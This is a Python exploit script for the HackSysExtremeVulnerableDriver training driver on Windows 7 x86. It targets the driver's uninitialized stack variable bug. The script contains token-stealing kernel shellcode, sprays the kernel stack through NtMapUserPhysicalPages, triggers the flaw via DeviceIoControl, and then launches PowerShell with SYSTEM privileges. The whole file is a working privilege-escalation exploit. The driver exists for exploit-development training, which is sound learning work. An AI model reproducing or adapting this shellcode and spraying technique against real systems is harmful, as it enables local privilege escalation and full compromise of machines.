#!/usr/bin/python
#
# HEVD v1.20 UninitializedStackVariable exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

# assembled with WinDBG
shellcode = ''
shellcode += '\x60'                             # pushad
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\x64\x8b\x80\x24\x01\x00\x00'     # mov     eax,dword ptr fs:[eax+124h] ; 0x124 = offset nt!_KPCR.PcrbData.CurrentThread
shellcode += '\x8b\x40\x50'                     # mov     eax,dword ptr [eax+50h]     ; 0x50 = offset nt!_KTHREAD.ApcState.Process
shellcode += '\x8b\xc8'                         # mov     ecx,eax
shellcode += '\xba\x04\x00\x00\x00'             # mov     edx,4
shellcode += '\x8b\x80\xb8\x00\x00\x00'         # mov     eax,dword ptr [eax+0B8h]    ; 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += '\x2d\xb8\x00\x00\x00'             # sub     eax,0B8h
shellcode += '\x39\x90\xb4\x00\x00\x00'         # cmp     dword ptr [eax+0B4h],edx    ; 0xB4 = offset nt!_EPROCESS.UniqueProcessId
shellcode += '\x75\xed'                         # jne     $-17
shellcode += '\x8b\x90\xf8\x00\x00\x00'         # mov     edx,dword ptr [eax+0F8h]    ; 0xF8 = offset nt!_EPROCESS.Token
shellcode += '\x89\x91\xf8\x00\x00\x00'         # mov     dword ptr [ecx+0F8h],edx
shellcode += '\x61'                             # popad
shellcode += '\xc3'                             # ret

def push_dword(value):
    '''
    just push dword
    '''
    code = '\x68' + struct.pack('<L', value)    # push    value
    return code

def call_func(addr):
    '''
    call func via eax
    '''
    code = ''
    code += '\xb8' + struct.pack('<L', addr)    # mov     eax,addr
    code += '\xff\xd0'                          # call    eax
    return code

def retn():
    '''
    just return
    '''
    code = '\xc3'                               # ret
    return code

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

shellcode_buffer = windll.kernel32.VirtualAlloc(0,
                                len(shellcode),
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if shellcode_buffer == 0:
    print '[-] Failed to allocate shellcode'
    sys.exit(1)
print '[+] Shellcode allocated at 0x%08x' % shellcode_buffer

memmove(shellcode_buffer, shellcode, len(shellcode))

print '[+] Resolving APIs'

hNtdll = windll.kernel32.LoadLibraryA('ntdll.dll')
NtMapUserPhysicalPages = windll.kernel32.GetProcAddress(hNtdll,
                                'NtMapUserPhysicalPages')

hKernel32 = windll.kernel32.LoadLibraryA('kernel32.dll')
DeviceIoControl = windll.kernel32.GetProcAddress(hKernel32,
                                'DeviceIoControl')

# allocate data to spray
spray = struct.pack('<L', shellcode_buffer) * 0x400
spray_buffer = windll.kernel32.VirtualAlloc(0,
                                len(spray),
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE
if spray_buffer == 0:
    print '[-] Failed to allocate spray data'
    sys.exit(1)
print '[+] Spray data allocated at 0x%08x' % spray_buffer

memmove(spray_buffer, spray, len(spray))

# building ad-hoc code. i know this is a terrible BAAD idea...
ioctl_code = 0x22202F
bytes_retn = c_int(0)
magic_dword = c_uint(0xcafebabe)
code = ''
code += push_dword(spray_buffer)
code += push_dword(0x400)
code += push_dword(0)
code += call_func(NtMapUserPhysicalPages)       # see http://j00ru.vexillium.org/?p=769
code += push_dword(0)
code += push_dword(addressof(bytes_retn))
code += push_dword(0)
code += push_dword(0)
code += push_dword(4)
code += push_dword(addressof(magic_dword))
code += push_dword(ioctl_code)
code += push_dword(hFile)
code += call_func(DeviceIoControl)              # UninitializedStackVariableIoctlHandler
code += retn()

code_buffer = windll.kernel32.VirtualAlloc(0,
                                len(code),
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if code_buffer == 0:
    print '[-] Failed to allocate ad-hoc code'
    sys.exit(1)
print '[+] Ad-hoc code allocated at 0x%08x' % code_buffer

memmove(code_buffer, code, len(code))

print '[+] Executing ad-hoc code'

WINFUNCTYPE(None)(code_buffer)()

# Got SYSTEM shell?
import os
os.system("powershell.exe")
